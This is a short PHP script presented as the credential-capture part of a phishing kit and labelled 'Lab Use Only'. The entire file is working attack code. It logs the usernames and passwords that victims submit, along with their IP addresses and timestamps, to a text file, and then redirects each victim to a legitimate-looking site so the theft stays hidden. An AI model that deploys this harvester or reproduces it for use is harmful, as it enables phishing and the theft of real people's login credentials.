<?php
// AYO Phishing Kit — Credential Capture (Lab Use Only)
$log = "captured.txt";
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $user = htmlspecialchars($_POST["username"] ?? "");
    $pass = htmlspecialchars($_POST["password"] ?? "");
    $ip   = $_SERVER["REMOTE_ADDR"];
    $time = date("Y-m-d H:i:s");
    $entry = "[$time] IP: $ip | User: $user | Pass: $pass\n";
    file_put_contents($log, $entry, FILE_APPEND);
    // Redirect to real site after capture
    header("Location: https://example.com");
    exit();
}
?>